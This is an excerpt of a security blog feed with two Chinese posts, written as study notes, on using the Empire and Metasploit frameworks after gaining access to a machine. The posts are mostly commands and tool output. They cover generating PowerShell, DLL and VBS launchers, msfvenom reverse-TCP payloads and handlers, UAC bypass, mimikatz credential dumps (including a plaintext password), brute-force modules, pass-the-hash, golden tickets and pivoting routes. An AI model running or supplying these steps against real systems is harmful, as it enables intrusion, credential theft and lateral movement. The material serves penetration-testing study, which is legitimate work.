class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">(Empire: listeners) &gt; usestager //列出可选择模块</span><br><span class="line">multi/bash                multi/war                 osx/dylib                 osx/macro                 windows/backdoorLnkMacro  windows/ducky             windows/launcher_sct      windows/macroless_msword</span><br><span class="line">multi/launcher            osx/applescript           osx/jar                   osx/pkg                   windows/bunny             windows/hta               windows/launcher_vbs      windows/shellcode</span><br><span class="line">multi/macro               osx/application           osx/launcher              osx/safari_launcher       windows/csharp_exe        windows/launcher_bat      windows/launcher_xml      windows/teensy</span><br><span class="line">multi/pyinstaller         osx/ducky                 osx/macho                 osx/teensy                windows/dll               windows/launcher_lnk      windows/macro </span><br><span class="line"></span><br><span class="line">dll木马：</span><br><span class="line">(Empire: listeners) &gt; usestager windows/dll</span><br><span class="line">(Empire: stager/windows/dll) &gt; info</span><br><span class="line"></span><br><span class="line">Name: DLL Launcher</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Generate a PowerPick Reflective DLL to inject with</span><br><span class="line">  stager code.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">  Name             Required    Value             Description</span><br><span class="line">  ----             --------    -------           -----------</span><br><span class="line">  Listener         True                          Listener to use.</span><br><span class="line">  ProxyCreds       False       default           Proxy credentials</span><br><span class="line">                                                 ([domain\]username:password) to use for</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Obfuscate        False       False             Switch. Obfuscate the launcher</span><br><span class="line">                                                 powershell code, uses the</span><br><span class="line">                                                 ObfuscateCommand for obfuscation types.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  Proxy            False       default           Proxy to use for request (default, none,</span><br><span class="line">                                                 or other).</span><br><span class="line">  Language         True        powershell        Language of the stager to generate.</span><br><span class="line">  OutFile          True        /tmp/launcher.dll File to output dll to.</span><br><span class="line">  UserAgent        False       default           User-agent string to use for the staging</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Arch             True        x64               Architecture of the .dll to generate</span><br><span class="line">                                                 (x64 or x86).</span><br><span class="line">  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.</span><br><span class="line">                                                 Only used if Obfuscate switch is True.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  StagerRetries    False       0                 Times for the stager to retry</span><br><span class="line">                                                 connecting.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: stager/windows/dll) &gt; set Listener test</span><br><span class="line">(Empire: stager/windows/dll) &gt; execute</span><br><span class="line"></span><br><span class="line">[*] Stager output written out to: /tmp/launcher.dll</span><br><span class="line"></span><br><span class="line">powershell木马：</span><br><span class="line">(Empire: listeners) &gt; launcher powershell test //powershell只需launcher powershell+name即可</span><br><span class="line"></span><br><span class="line">launcher_vbs木马：</span><br><span class="line">(Empire: listeners) &gt; usestager windows/launcher_vbs</span><br><span class="line">(Empire: stager/windows/launcher_vbs) &gt; info</span><br><span class="line"></span><br><span class="line">Name: VBS Launcher</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Generates a .vbs launcher for Empire.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">  Name             Required    Value             Description</span><br><span class="line">  ----             --------    -------           -----------</span><br><span class="line">  Listener         True                          Listener to generate stager for.</span><br><span class="line">  OutFile          False       /tmp/launcher.vbs File to output .vbs launcher to,</span><br><span class="line">                                                 otherwise displayed on the screen.</span><br><span class="line">  Obfuscate        False       False             Switch. Obfuscate the launcher</span><br><span class="line">                                                 powershell code, uses the</span><br><span class="line">                                                 ObfuscateCommand for obfuscation types.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  ObfuscateCommand False       Token\All\1,Launcher\PS\12467The Invoke-Obfuscation command to use.</span><br><span class="line">                                                 Only used if Obfuscate switch is True.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  Language         True        powershell        Language of the stager to generate.</span><br><span class="line">  ProxyCreds       False       default           Proxy credentials</span><br><span class="line">                                                 ([domain\]username:password) to use for</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  UserAgent        False       default           User-agent string to use for the staging</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Proxy            False       default           Proxy to use for request (default, none,</span><br><span class="line">                                                 or other).</span><br><span class="line">  StagerRetries    False       0                 Times for the stager to retry</span><br><span class="line">                                                 connecting.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: stager/windows/launcher_vbs) &gt; set Listener test</span><br><span class="line">(Empire: stager/windows/launcher_vbs) &gt; execute</span><br><span class="line"></span><br><span class="line">[*] Stager output written out to: /tmp/launcher.vbs</span><br></pre></td></tr></table></figure><p>我们暂时使用powershell木马进行连接实验然后进行后续模块学习，通过在目标机器上粘贴我们的powershell木马进行回连。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; agents  //列表列出当前回连的链路</span><br><span class="line"></span><br><span class="line">[*] Active agents:</span><br><span class="line"></span><br><span class="line"> Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen</span><br><span class="line"> ----     -- -----------     ------------      --------                -------            ---    -----    ---------</span><br><span class="line"> A2B7YFVG ps 192.168.199.122 WIN-6S1ISV98BNM   *TEST\Administrator     powershell         3064   5/0.0    2018-11-04 03:09:33</span><br><span class="line"> (Empire: agents) &gt; interact A2B7YFVG //连接进行该目标机进行操作，进入后可以help进行命令了解</span><br><span class="line"> (Empire: A2B7YFVG) &gt; help    //可以进行mimikatz，bypassuac等等</span><br><span class="line"></span><br><span class="line">Agent Commands</span><br><span class="line">==============</span><br><span class="line">agents            Jump to the agents menu.</span><br><span class="line">back              Go back a menu.</span><br><span class="line">bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn &lt;listener&gt;</span><br><span class="line">clear             Clear out agent tasking.</span><br><span class="line">creds             Display/return credentials from the database.</span><br><span class="line">download          Task an agent to download a file.</span><br><span class="line">exit              Task agent to exit.</span><br><span class="line">help              Displays the help menu or syntax for particular commands.</span><br><span class="line">info              Display information about this agent</span><br><span class="line">injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode &lt;meter_listener&gt; &lt;pid&gt;</span><br><span class="line">jobs              Return jobs or kill a running job.</span><br><span class="line">kill              Task an agent to kill a particular process name or ID.</span><br><span class="line">killdate          Get or set an agent&apos;s killdate (01/01/2016).</span><br><span class="line">list              Lists all active agents (or listeners).</span><br><span class="line">listeners         Jump to the listeners menu.</span><br><span class="line">lostlimit         Task an agent to change the limit on lost agent detection</span><br><span class="line">main              Go back to the main menu.</span><br><span class="line">mimikatz          Runs Invoke-Mimikatz on the client.</span><br><span class="line">psinject          Inject a launcher into a remote process. Ex. psinject &lt;listener&gt; &lt;pid/process_name&gt;</span><br><span class="line">pth               Executes PTH for a CredID through Mimikatz.</span><br><span class="line">rename            Rename the agent.</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.</span><br><span class="line">revtoself         Uses credentials/tokens to revert token privileges.</span><br><span class="line">sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]</span><br><span class="line">scriptcmd         Execute a function in the currently imported PowerShell script.</span><br><span class="line">scriptimport      Imports a PowerShell script and keeps it in memory in the agent.</span><br><span class="line">searchmodule      Search Empire module names/descriptions.</span><br><span class="line">shell             Task an agent to use a shell command.</span><br><span class="line">shinject          Inject non-meterpreter listener shellcode into a remote process. Ex. shinject &lt;listener&gt; &lt;pid&gt;</span><br><span class="line">sleep             Task an agent to &apos;sleep interval [jitter]&apos;</span><br><span class="line">spawn             Spawns a new Empire agent for the given listener name. Ex. spawn &lt;listener&gt;</span><br><span class="line">steal_token       Uses credentials/tokens to impersonate a token for a given process ID.</span><br><span class="line">sysinfo           Task an agent to get system information.</span><br><span class="line">updatecomms       Dynamically update the agent comms to another listener</span><br><span class="line">updateprofile     Update an agent connection profile.</span><br><span class="line">upload            Task an agent to upload a file.</span><br><span class="line">usemodule         Use an Empire PowerShell module.</span><br><span class="line">workinghours      Get or set an agent&apos;s working hours (9:00-17:00).</span><br></pre></td></tr></table></figure><h2 id="模块学习"><a href="#模块学习" class="headerlink" title="模块学习"></a>模块学习</h2><h3 id="检查UAC提权方法模块"><a href="#检查UAC提权方法模块" class="headerlink" title="检查UAC提权方法模块"></a>检查UAC提权方法模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; interact V92TNFDK //进入目标机</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule （空格+tab键） //查看usemodule的模块，注意需要在进入到代理主机才能使用该模块,UAC提权需要是管理员组的用户才行</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule privesc/powerup/allchecks //检查提权方法模块</span><br><span class="line">(Empire: V92TNFDK) &gt; execute //执行检查</span><br></pre></td></tr></table></figure><h3 id="UAC提权模块"><a href="#UAC提权模块" class="headerlink" title="UAC提权模块"></a>UAC提权模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: V92TNFDK) &gt; bypassuac test //执行uac提权,back之后看到带有*的用户的name,表示代理已提权过</span><br></pre></td></tr></table></figure><h3 id="域环境信息收集模块"><a href="#域环境信息收集模块" class="headerlink" title="域环境信息收集模块"></a>域环境信息收集模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: V92TNFDK) &gt; usemodule situational_awareness/network/bloodhound //bloodhound是一个域环境收集的工具，在学习empire的时候看见它的后渗透模块也集成了该工具，以后详细介绍该工具</span><br></pre></td></tr></table></figure><h3 id="mimikatz模块"><a href="#mimikatz模块" class="headerlink" title="mimikatz模块"></a>mimikatz模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(Empire: V92TNFDK) &gt; mimikatz  //对于后渗透工具，hash dump的工具也是必不可少的</span><br><span class="line">(Empire: V92TNFDK) &gt; creds     //列举密码 同时通过pth 也可以进行下一步令牌窃取</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line"></span><br><span class="line">  CredID  CredType   Domain                   UserName         Host             Password</span><br><span class="line">  ------  --------   ------                   --------         ----             --------</span><br><span class="line">  1       hash       test.com                 Administrator    WIN-6S1ISV98BNM  e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line">  2       hash       test.com                 WIN-6S1ISV98BNM$ WIN-6S1ISV98BNM  256897bbd391086a1fea9e03a711487c</span><br><span class="line">  3       plaintext  test.com                 Administrator    WIN-6S1ISV98BNM  P@ssw0rd</span><br><span class="line">  4       hash       test.com                 WIN-6S1ISV98BNM$ WIN-6S1ISV98BNM  c8c4141f359974d60d46e5a60e0f1407</span><br></pre></td></tr></table></figure><h3 id="联动Metasploit"><a href="#联动Metasploit" class="headerlink" title="联动Metasploit"></a>联动Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">empire：</span><br><span class="line">(Empire: agents) &gt; interact V92TNFDK</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule code_execution/invoke_shellcode</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; info</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; set Lhost  10.0.0.86</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; set Lport 4433</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; execute</span><br><span class="line"></span><br><span class="line">metasploit：</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.199.122</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure><h3 id="其他常用的模块"><a href="#其他常用的模块" class="headerlink" title="其他常用的模块"></a>其他常用的模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(Empire: V92TNFDK) &gt;usemodule situational_awareness/network/find_localadmin_access #加载本地管理组访问模块</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule lateral_movement/invoke_psexec // psexec模块横向生成一个反弹代理</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule credentials/mimikatz/dcsync  //获取域的krbtgt值</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule credentials/mimikatz/golden_ticket //获得黄金票据</span><br><span class="line">(Empire: V92TNFDK) &gt;usemodule situational_awareness/host/computerdetails //获取系统日志</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Metasploit，Empire，Cobal strike是日常渗透中最经常使用的三大平台，对于三大平台的学习，可以使渗透工作事半功倍，在Empire之后，还有把Cobal strike的日常学习也要总结出来，有时候不经常总结就会遗忘。</p><p>本文的学习参考来自于<a href="https://xz.aliyun.com/t/67" target="_blank" rel="noopener">https://xz.aliyun.com/t/67</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;empire是一款基于python编写的，使用powershell进行后渗透的工具，它类似于metasploit的渗透测试框架，empire可以实现无需powershell.exe即可运行PowerShell 代理的功能，从键盘记录器到Mimikatz 等快速部署的后期开发模块，以及适应性通信以避开网络检测，所有这些都包含在以可用性为重点的框架中。目前empire的版本号为empire2.5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;安装启动&quot;&gt;&lt;a href=&quot;#安装启动&quot; class=&quot;headerlink&quot; title=&quot;安装启动&quot;&gt;&lt;/a&gt;安装启动&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/EmpireProject/Empire.git    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd Empire/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd setup/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./install.sh &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./empire&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://www.marksec.org/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="empire" scheme="https://www.marksec.org/tags/empire/"/>
    
      <category term="powershell" scheme="https://www.marksec.org/tags/powershell/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit常用模块总结</title>
    <link href="https://www.marksec.org/2018/07/06/Metasploit%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.marksec.org/2018/07/06/Metasploit使用小结/</id>
    <published>2018-07-06T09:55:00.000Z</published>
    <updated>2019-03-24T05:25:01.952Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf常用模块整理"><a href="#msf常用模块整理" class="headerlink" title="msf常用模块整理"></a>msf常用模块整理</h2><blockquote><p>主机信息收集</p></blockquote><p>使用<code>auxiliary/scanner/discovery/</code>下模块进行扫描</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">use auxiliary/scanner/discovery/empty_udp</span><br><span class="line">use auxiliary/scanner/discovery/ipv6_multicast_ping</span><br><span class="line">use auxiliary/scanner/discovery/ipv6_neighbor</span><br><span class="line">use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure><a id="more"></a><blockquote><p>主机端口扫描</p></blockquote><p>使用<code>auxiliary/scanner/portscan/</code>下的模块探测主机端口</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack       //ACK防火墙扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce // FTP跳端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn       //SYN端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp       //TCP端口扫描</span><br><span class="line">auxiliary/scanner/portscan/xmas      //TCP”XMas”端口扫描</span><br></pre></td></tr></table></figure><blockquote><p>SMB登录扫描</p></blockquote><p>使用<code>auxiliary/scanner/smb/</code>下的模块进行SMB相关操作</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/pipe_auditor</span><br><span class="line">auxiliary/scanner/smb/pipe_dcerpc_auditor    //返回DCERPC信息</span><br><span class="line">auxiliary/scanner/smb/psexec_loggedin_users  </span><br><span class="line">auxiliary/scanner/smb/smb2                   //扫描SMB2协议</span><br><span class="line">auxiliary/scanner/smb/smb_enum_gpp           </span><br><span class="line">auxiliary/scanner/smb/smb_enumshares         //扫描smb共享文件</span><br><span class="line">auxiliary/scanner/smb/smb_enumusers          //smb枚举系统用户</span><br><span class="line">auxiliary/scanner/smb/smb_enumusers_domain   </span><br><span class="line">auxiliary/scanner/smb/smb_login              //SMB登录</span><br><span class="line">auxiliary/scanner/smb/smb_lookupsid          //扫描组的用户</span><br><span class="line">auxiliary/scanner/smb/smb_uninit_cred        </span><br><span class="line">auxiliary/scanner/smb/smb_version            //扫描系统版本</span><br></pre></td></tr></table></figure><blockquote><p>SQLSERVER登录扫描</p></blockquote><p>使用<code>auxiliary/scanner/mssql/</code>下的模块探测SQL server的信息</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mssql/mssql_hashdump  //dump密码hash</span><br><span class="line">auxiliary/scanner/mssql/mssql_login     //密码爆破</span><br><span class="line">auxiliary/scanner/mssql/mssql_ping      //嗅探</span><br><span class="line">auxiliary/scanner/mssql/mssql_schemadump</span><br></pre></td></tr></table></figure><blockquote><p>SSH探测扫描</p></blockquote><p>使用<code>auxiliary/scanner/ssh/</code>下的模块探测ssh信息</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/cerberus_sftp_enumusers</span><br><span class="line">auxiliary/scanner/ssh/detect_kippo</span><br><span class="line">auxiliary/scanner/ssh/ssh_enumusers     //枚举用户</span><br><span class="line">auxiliary/scanner/ssh/ssh_identify_pubkeys</span><br><span class="line">auxiliary/scanner/ssh/ssh_login         //密码爆破</span><br><span class="line">auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">auxiliary/scanner/ssh/ssh_version       //查看版本</span><br></pre></td></tr></table></figure><blockquote><p>FTP探测扫描</p></blockquote><p>使用<code>auxiliary/scanner/ftp/</code>下的模块探测ftp信息</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/anonymous         </span><br><span class="line">auxiliary/scanner/ftp/bison_ftp_traversal</span><br><span class="line">auxiliary/scanner/ftp/ftp_login         //密码爆破</span><br><span class="line">auxiliary/scanner/ftp/ftp_version       //查看版本</span><br><span class="line">auxiliary/scanner/ftp/konica_ftp_traversal</span><br><span class="line">auxiliary/scanner/ftp/pcman_ftp_traversal</span><br><span class="line">auxiliary/scanner/ftp/titanftp_xcrc_traversal</span><br></pre></td></tr></table></figure><blockquote><p>MYSQL探测扫描</p></blockquote><p>使用<code>auxiliary/scanner/mysql/</code>下的模块探测mysql信息</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">auxiliary/scanner/mysql/mysql_file_enum</span><br><span class="line">auxiliary/scanner/mysql/mysql_hashdump   //dump密码hash</span><br><span class="line">auxiliary/scanner/mysql/mysql_login      //密码爆破</span><br><span class="line">auxiliary/scanner/mysql/mysql_schemadump</span><br><span class="line">auxiliary/scanner/mysql/mysql_version    //查看版本</span><br></pre></td></tr></table></figure><h2 id="内网操作基本步骤流程"><a href="#内网操作基本步骤流程" class="headerlink" title="内网操作基本步骤流程"></a>内网操作基本步骤流程</h2><blockquote><p>制作msf回连木马  </p></blockquote><p>当获得webshell的时候，我们制作一个msf木马来进行回连</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 =F exe &gt;/root/Desktop/443.exe</code></p><blockquote><p>回连准备</p></blockquote><p>打开msfconsole，准备进行回连<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler                     //使用后门模块</span><br><span class="line">set payload windows/meterpreter/reverse_tcp   //设置payload</span><br><span class="line">show options                   </span><br><span class="line">set LHOST 192.168.1.1                         //设置回连地址</span><br><span class="line">set lport 443                                 //设置回连端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><blockquote><p>查看基本情况</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getuid     //查看当前用户</span><br><span class="line">getsystem  //提权</span><br></pre></td></tr></table></figure><blockquote><p> 提权</p></blockquote><p><code>background</code> 或 <code>ctrl+z</code><br>将回连的meterpreter放入session中 sessions ­i 号 叫回session 在msf下use exploit/windows/local/ TAB 可以列出所有的可提权的模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; use exploit/windows/local/             //调用windows的本地模块</span><br></pre></td></tr></table></figure><blockquote><p>密码获取与解密</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump      //密码获取</span><br><span class="line">load mimikatz //使用mimikatz</span><br><span class="line">kerberos      //查看解密</span><br></pre></td></tr></table></figure><blockquote><p>新路由查看子网</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">route         //查看路由</span><br><span class="line">background </span><br><span class="line">sessions </span><br><span class="line">route add 192.168.2.0 255.255.255.0 2    //路由添加</span><br><span class="line">search mssql   //找mssql模块</span><br><span class="line">use auxiliary/scanner/mssql/mssql_login  //使用login模块</span><br></pre></td></tr></table></figure><blockquote><p>查看机器是否是虚拟机</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面的这些模块是我们使用mfs中最经常使用的模块，对这些基础模块进行一个整理，以后使用会更加方便一点，当时是一个特别棒的工具，以后再慢慢写其他的模块。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;msf常用模块整理&quot;&gt;&lt;a href=&quot;#msf常用模块整理&quot; class=&quot;headerlink&quot; title=&quot;msf常用模块整理&quot;&gt;&lt;/a&gt;msf常用模块整理&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;主机信息收集&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用&lt;code&gt;auxiliary/scanner/discovery/&lt;/code&gt;下模块进行扫描&lt;/p&gt;
&lt;p&gt;模块有：&lt;/p&gt;
